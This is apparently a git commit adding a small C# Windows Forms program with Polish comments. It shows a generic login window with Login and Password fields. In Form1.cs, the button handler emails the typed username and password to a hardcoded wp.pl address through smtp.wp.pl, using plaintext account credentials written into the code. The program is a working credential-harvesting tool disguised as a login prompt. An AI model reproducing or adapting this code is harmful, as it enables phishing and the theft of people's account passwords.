e572238fad1b3073510db8f3a1f2ace736f1e1dc
BrotherBigDuck <35629057+BrotherBigDuck@users.noreply.github.com>
2018-01-20 14:06:05 +0100

    Initial Commit

---
+++ Form1.Designer.cs
@@ -0,0 +1,116 @@
+﻿namespace HasloLoginMail
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.password_tb = new System.Windows.Forms.TextBox();
+            this.login_tb = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.loguj_bbtn = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // password_tb
+            // 
+            this.password_tb.Location = new System.Drawing.Point(259, 136);
+            this.password_tb.Name = "password_tb";
+            this.password_tb.Size = new System.Drawing.Size(100, 20);
+            this.password_tb.TabIndex = 0;
+            // 
+            // login_tb
+            // 
+            this.login_tb.Location = new System.Drawing.Point(67, 136);
+            this.login_tb.Name = "login_tb";
+            this.login_tb.Size = new System.Drawing.Size(100, 20);
+            this.login_tb.TabIndex = 1;
+            // 
+            // label1
+            // 
+            this.label1.Location = new System.Drawing.Point(0, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(100, 23);
+            this.label1.TabIndex = 0;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(74, 120);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(33, 13);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "Login";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(267, 120);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(53, 13);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "Password";
+            // 
+            // loguj_bbtn
+            // 
+            this.loguj_bbtn.Location = new System.Drawing.Point(158, 196);
+            this.loguj_bbtn.Name = "loguj_bbtn";
+            this.loguj_bbtn.Size = new System.Drawing.Size(75, 23);
+            this.loguj_bbtn.TabIndex = 4;
+            this.loguj_bbtn.Text = "button1";
+            this.loguj_bbtn.UseVisualStyleBackColor = true;
+            this.loguj_bbtn.Click += new System.EventHandler(this.loguj_bbtn_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(459, 367);
+            this.Controls.Add(this.loguj_bbtn);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.login_tb);
+            this.Controls.Add(this.password_tb);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox password_tb;
+        private System.Windows.Forms.TextBox login_tb;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Button loguj_bbtn;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net.Mail;
+using System.Net;
+
+namespace HasloLoginMail
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void loguj_bbtn_Click(object sender, EventArgs e)
+        {
+            MailMessage mail = new MailMessage("mmxmistrzpl@wp.pl", "mmxmistrz@wp.pl");//Do kogo
+            SmtpClient client = new SmtpClient("smtp.wp.pl", 465); //Od kogo
+
+            client.Credentials = new NetworkCredential("mmxmistrzpl@wp.pl", "mmxmistrz@wp,pl");
+            client.EnableSsl = true; //Szyfrowanie wiadomosci (nieczytelne dla czlowieka)
+
+            mail.Subject = "Hello world"; //Temat
+            mail.Body = "Login: " + login_tb.Text + "\n" + " Password: " + password_tb.Text; //Zawartosc wiadomosci
+
+            client.Send(mail); //Wysylanie wiadomosci
+        }
+
+
+    }
+}
